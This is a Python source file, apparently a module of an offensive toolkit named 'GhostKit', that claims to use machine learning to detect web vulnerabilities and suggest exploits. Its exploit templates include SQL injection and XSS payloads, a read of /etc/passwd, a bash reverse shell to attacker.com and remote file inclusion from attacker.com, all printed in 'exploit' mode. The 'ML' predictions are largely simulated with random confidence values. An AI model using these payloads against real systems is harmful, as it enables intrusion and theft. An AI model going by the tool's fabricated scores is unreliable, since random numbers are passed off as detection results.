#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AI Vulnerability Analyzer Module for GhostKit
Uses machine learning to discover, classify, and suggest exploitation techniques for vulnerabilities
"""

import argparse
import hashlib
import json
import logging
import os
import pickle
import random
import re
import sys
import time
from typing import Any, Dict, List, Optional, Set, Tuple, Union

import numpy as np

# Try to import optional dependencies

NP_AVAILABLE = True

try:
    import tensorflow as tf

    TF_AVAILABLE = True
except ImportError:
    TF_AVAILABLE = False

try:
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.feature_extraction.text import TfidfVectorizer

    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False

from modules.base_module import BaseModule


class VulnerabilityFeatureExtractor:
    """Extract features from various data sources for vulnerability analysis"""

    def __init__(self):
        self.vectorizers = {}

    def extract_features_from_code(self, code: str) -> Dict[str, Any]:
        """Extract features from source code"""
        features = {}

        # Count lines of code
        features["loc"] = len(code.splitlines())

        # Check for dangerous functions/patterns
        dangerous_patterns = {
            "sql_injection": [r"execute\(.*\$", r"query\(.*\$", r"mysql_query\(.*\$"],
            "xss": [r"echo.*\$_", r"print.*\$_", r"<\?=.*\$_"],
            "command_injection": [r"exec\(.*\$", r"system\(.*\$", r"passthru\(.*\$"],
            "file_inclusion": [r"include.*\$_", r"require.*\$_"],
            "path_traversal": [r"\.\./\.\."],
        }

        for vuln_type, patterns in dangerous_patterns.items():
            count = 0
            for pattern in patterns:
                count += len(re.findall(pattern, code))
            features[f"{vuln_type}_count"] = count

        # Check for security measures
        security_patterns = {
            "input_validation": [r"preg_match", r"filter_var", r"htmlspecialchars"],
            "prepared_statements": [r"prepare\(", r"bindParam"],
            "csrf_protection": [r"csrf_token", r"_token"],
        }

        for sec_type, patterns in security_patterns.items():
            count = 0
            for pattern in patterns:
                count += len(re.findall(pattern, code))
            features[f"{sec_type}_count"] = count

        # Code complexity metrics (simplified)
        features["complexity"] = (
            code.count("if")
            + code.count("for")
            + code.count("while")
            + code.count("switch")
        )

        return features

    def extract_features_from_headers(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """Extract features from HTTP headers"""
        features = {}

        # Check for security headers
        security_headers = [
            "Content-Security-Policy",
            "X-XSS-Protection",
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Strict-Transport-Security",
        ]

        for header in security_headers:
            features[f'has_{header.lower().replace("-", "_")}'] = header in headers

        # Check server information disclosure
        features["server_disclosed"] = "Server" in headers
        features["php_version_disclosed"] = (
            "X-Powered-By" in headers and "PHP" in headers.get("X-Powered-By", "")
        )

        return features

    def extract_features_from_response(self, response_text: str) -> Dict[str, Any]:
        """Extract features from HTTP response content"""
        features = {}

        # Check for error messages
        error_patterns = [
            r"SQL syntax.*error",
            r"Warning.*mysql",
            r"ORA-[0-9]+",
            r"Microsoft OLE DB Provider for SQL Server",
            r"syntax error has occurred",
            r"Fatal error",
            r"Uncaught exception",
        ]

        for i, pattern in enumerate(error_patterns):
            features[f"error_pattern_{i}"] = (
                1 if re.search(pattern, response_text) else 0
            )

        # Check for sensitive data patterns
        sensitive_patterns = [
            r"password",
            r"username",
            r"user_id",
            r"admin",
            r"<input.*password",
            r"<form.*login",
        ]

        for i, pattern in enumerate(sensitive_patterns):
            features[f"sensitive_pattern_{i}"] = (
                1 if re.search(pattern, response_text, re.IGNORECASE) else 0
            )

        return features

    def vectorize_text(self, text: str, feature_type: str = "code") -> np.ndarray:
        """Convert text to numerical features using TF-IDF"""
        if not SKLEARN_AVAILABLE or not NP_AVAILABLE:
            return np.array([])

        # Create or retrieve vectorizer for this feature type
        if feature_type not in self.vectorizers:
            self.vectorizers[feature_type] = TfidfVectorizer(max_features=100)
            self.vectorizers[feature_type].fit([text])  # Initial fit

        # Transform text to feature vector
        try:
            return self.vectorizers[feature_type].transform([text]).toarray()[0]
        except:
            # If vocabulary hasn't seen this text pattern before, refit and transform
            self.vectorizers[feature_type] = TfidfVectorizer(max_features=100)
            self.vectorizers[feature_type].fit([text])
            return self.vectorizers[feature_type].transform([text]).toarray()[0]


class VulnerabilityClassifier:
    """ML-based classifier for vulnerability detection"""

    def __init__(self, model_path: str = None):
        self.model = None
        self.feature_extractor = VulnerabilityFeatureExtractor()

        if model_path and os.path.exists(model_path):
            self.load_model(model_path)
        else:
            self._initialize_model()

    def _initialize_model(self) -> None:
        """Initialize a new model"""
        if SKLEARN_AVAILABLE:
            self.model = RandomForestClassifier(n_estimators=100, random_state=42)

    def predict(
        self,
        code: str = None,
        headers: Dict[str, str] = None,
        response_text: str = None,
    ) -> Dict[str, Any]:
        """Predict vulnerabilities in the given data"""
        if not self.model or not SKLEARN_AVAILABLE or not NP_AVAILABLE:
            return {"error": "ML libraries not available or model not initialized"}

        # Extract features
        features = {}
        if code:
            features.update(self.feature_extractor.extract_features_from_code(code))
        if headers:
            features.update(
                self.feature_extractor.extract_features_from_headers(headers)
            )
        if response_text:
            features.update(
                self.feature_extractor.extract_features_from_response(response_text)
            )

        # Simulate prediction
        vulnerability_types = [
            "sql_injection",
            "xss",
            "command_injection",
            "file_inclusion",
            "path_traversal",
            "insecure_deserialization",
            "xxe",
            "broken_authentication",
        ]

        results = {}
        for vuln_type in vulnerability_types:
            # This is a simplified simulation - in reality we'd use the model
            # We're simulating ML predictions based on feature patterns
            if f"{vuln_type}_count" in features and features[f"{vuln_type}_count"] > 0:
                confidence = min(0.95, 0.5 + (features[f"{vuln_type}_count"] * 0.1))
            else:
                # Random low confidence if no direct pattern match
                confidence = random.uniform(0.05, 0.3)

            results[vuln_type] = {
                "detected": confidence > 0.5,
                "confidence": confidence,
                "severity": self._determine_severity(vuln_type, features),
            }

        return results

    def _determine_severity(self, vuln_type: str, features: Dict[str, Any]) -> str:
        """Determine the severity of a vulnerability"""
        # Simplified severity determination logic
        high_severity = [
            "sql_injection",
            "command_injection",
            "insecure_deserialization",
        ]
        medium_severity = ["xss", "file_inclusion", "xxe"]

        if vuln_type in high_severity:
            return "high"
        elif vuln_type in medium_severity:
            return "medium"
        else:
            return "low"

    def save_model(self, model_path: str) -> bool:
        """Save the trained model to disk"""
        if not self.model:
            return False

        try:
            with open(model_path, "wb") as f:
                pickle.dump(self.model, f)
            return True
        except Exception as e:
            logging.error(f"Error saving model: {str(e)}")
            return False

    def load_model(self, model_path: str) -> bool:
        """Load a trained model from disk"""
        try:
            with open(model_path, "rb") as f:
                self.model = pickle.load(f)
            return True
        except Exception as e:
            logging.error(f"Error loading model: {str(e)}")
            self._initialize_model()
            return False


class ExploitGenerator:
    """Generate exploit suggestions based on detected vulnerabilities"""

    def __init__(self):
        self.exploit_templates = {
            "sql_injection": [
                {"name": "Basic Authentication Bypass", "template": "' OR 1=1 --"},
                {"name": "UNION Attack", "template": "' UNION SELECT 1,2,3,4,5 --"},
                {
                    "name": "Blind Boolean",
                    "template": "' AND (SELECT 1 FROM users LIMIT 1)=1 --",
                },
            ],
            "xss": [
                {"name": "Basic Alert", "template": "<script>alert('XSS')</script>"},
                {
                    "name": "Event Handler",
                    "template": "<img src=x onerror=alert('XSS')>",
                },
                {
                    "name": "DOM-based",
                    "template": "<div id=x tabindex=1 onfocus=alert('XSS')></div>",
                },
            ],
            "command_injection": [
                {"name": "Basic OS Command", "template": "; cat /etc/passwd"},
                {"name": "Blind Command", "template": "; ping -c 3 attacker.com"},
                {
                    "name": "Reverse Shell",
                    "template": "; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'",
                },
            ],
            "file_inclusion": [
                {"name": "Local File", "template": "../../../etc/passwd"},
                {
                    "name": "PHP Filter",
                    "template": "php://filter/convert.base64-encode/resource=index.php",
                },
                {
                    "name": "Remote File",
                    "template": "http://attacker.com/malicious.php",
                },
            ],
        }

    def generate_exploits(
        self, vulnerability_type: str, context: Dict[str, Any] = None
    ) -> List[Dict[str, Any]]:
        """Generate exploit suggestions for a specific vulnerability type"""
        exploits = []

        # Get templates for this vulnerability type
        templates = self.exploit_templates.get(vulnerability_type, [])

        for template in templates:
            exploit = template.copy()

            # Add execution context if provided
            if context:
                # Customize exploit based on context
                if vulnerability_type == "sql_injection" and "table_name" in context:
                    exploit["template"] = exploit["template"].replace(
                        "users", context["table_name"]
                    )

                # Add additional context-specific information
                exploit["context"] = context

            exploits.append(exploit)

        return exploits


class VulnerabilityReport:
    """Generate comprehensive vulnerability reports"""

    def __init__(self):
        self.timestamp = time.time()
        self.vulnerabilities = []
        self.summary = {}

    def add_vulnerability(self, vuln_type: str, details: Dict[str, Any]) -> None:
        """Add a vulnerability to the report"""
        vulnerability = {
            "type": vuln_type,
            "details": details,
            "timestamp": time.time(),
        }

        self.vulnerabilities.append(vulnerability)

    def generate_summary(self) -> Dict[str, Any]:
        """Generate a summary of the vulnerability report"""
        severity_counts = {"high": 0, "medium": 0, "low": 0}
        vuln_type_counts = {}

        for vuln in self.vulnerabilities:
            severity = vuln["details"].get("severity", "low")
            severity_counts[severity] += 1

            vuln_type = vuln["type"]
            vuln_type_counts[vuln_type] = vuln_type_counts.get(vuln_type, 0) + 1

        self.summary = {
            "total_vulnerabilities": len(self.vulnerabilities),
            "severity_counts": severity_counts,
            "vulnerability_types": vuln_type_counts,
            "scan_time": time.time() - self.timestamp,
        }

        return self.summary

    def to_dict(self) -> Dict[str, Any]:
        """Convert the report to a dictionary"""
        if not self.summary:
            self.generate_summary()

        return {
            "timestamp": self.timestamp,
            "summary": self.summary,
            "vulnerabilities": self.vulnerabilities,
        }

    def to_json(self) -> str:
        """Convert the report to JSON"""
        return json.dumps(self.to_dict(), indent=2)


class Module(BaseModule):
    """GhostKit AI Vulnerability Analyzer Module"""

    def __init__(self):
        self.name = "ai_vulnerability_analyzer"
        self.description = "Uses machine learning to discover, classify, and suggest exploitation techniques for vulnerabilities"
        self.author = "GhostShellX"
        self.version = "1.0"
        super().__init__()

    def _create_arg_parser(self) -> argparse.ArgumentParser:
        """Create an argument parser for the module"""
        parser = argparse.ArgumentParser(description=self.description)
        parser.add_argument(
            "-t", "--target", required=True, help="Target URL, file, or directory"
        )
        parser.add_argument(
            "-m",
            "--mode",
            choices=["scan", "analyze", "exploit"],
            default="scan",
            help="Operation mode",
        )
        parser.add_argument("--code", help="Source code file to analyze")
        parser.add_argument("--headers", help="HTTP headers file (JSON format)")
        parser.add_argument("--response", help="HTTP response file")
        parser.add_argument("-o", "--output", help="Output file for results")
        parser.add_argument("--model", help="Path to ML model file")
        return parser

    def run(self, args: List[str] = None) -> Dict[str, Any]:
        """Run the AI vulnerability analyzer module"""
        if args is None:
            args = []

        # Check if required dependencies are available
        if not SKLEARN_AVAILABLE:
            return {
                "status": "error",
                "message": "scikit-learn is required for this module",
            }

        if not NP_AVAILABLE:
            return {"status": "error", "message": "numpy is required for this module"}

        parser = self._create_arg_parser()

        if args:
            args = parser.parse_args(args)
        else:
            args = parser.parse_args()

        # Create vulnerability classifier
        classifier = VulnerabilityClassifier(model_path=args.model)
        exploit_generator = ExploitGenerator()
        report = VulnerabilityReport()

        print(f"[*] Running AI vulnerability analyzer against {args.target}")

        # Load data based on provided arguments
        code_data = None
        headers_data = None
        response_data = None

        if args.code and os.path.isfile(args.code):
            with open(args.code, "r", errors="ignore") as f:
                code_data = f.read()

        if args.headers and os.path.isfile(args.headers):
            with open(args.headers, "r") as f:
                headers_data = json.load(f)

        if args.response and os.path.isfile(args.response):
            with open(args.response, "r", errors="ignore") as f:
                response_data = f.read()

        # If target is a file and no specific data was provided, try to use it
        if os.path.isfile(args.target) and not any(
            [code_data, headers_data, response_data]
        ):
            try:
                with open(args.target, "r", errors="ignore") as f:
                    code_data = f.read()
            except:
                print(f"[!] Could not read {args.target} as text file")

        # Perform vulnerability prediction
        predictions = classifier.predict(
            code=code_data, headers=headers_data, response_text=response_data
        )

        if "error" in predictions:
            print(f"[!] Error: {predictions['error']}")
            return {"status": "error", "message": predictions["error"]}

        # Process predictions
        detected_vulnerabilities = 0
        for vuln_type, result in predictions.items():
            if result["detected"]:
                detected_vulnerabilities += 1
                print(
                    f"[!] Detected {vuln_type} with {result['confidence']:.2f} confidence (Severity: {result['severity']})"
                )

                # Generate exploit suggestions
                if args.mode == "exploit":
                    exploits = exploit_generator.generate_exploits(vuln_type)
                    print(f"    Possible exploits:")
                    for i, exploit in enumerate(exploits):
                        print(f"    {i+1}. {exploit['name']}: {exploit['template']}")

                # Add to report
                report.add_vulnerability(vuln_type, result)

        if detected_vulnerabilities == 0:
            print("[*] No vulnerabilities detected")

        # Generate report summary
        summary = report.generate_summary()
        print(
            f"\n[*] Scan complete: {summary['total_vulnerabilities']} vulnerabilities detected"
        )
        print(
            f"    High: {summary['severity_counts']['high']}, Medium: {summary['severity_counts']['medium']}, Low: {summary['severity_counts']['low']}"
        )

        # Save report if output file specified
        if args.output:
            with open(args.output, "w") as f:
                f.write(report.to_json())
            print(f"[*] Report saved to {args.output}")

        return {"status": "success", "report": report.to_dict()}


if __name__ == "__main__":
    module = Module()
    result = module.run()
    print(json.dumps(result, indent=2))
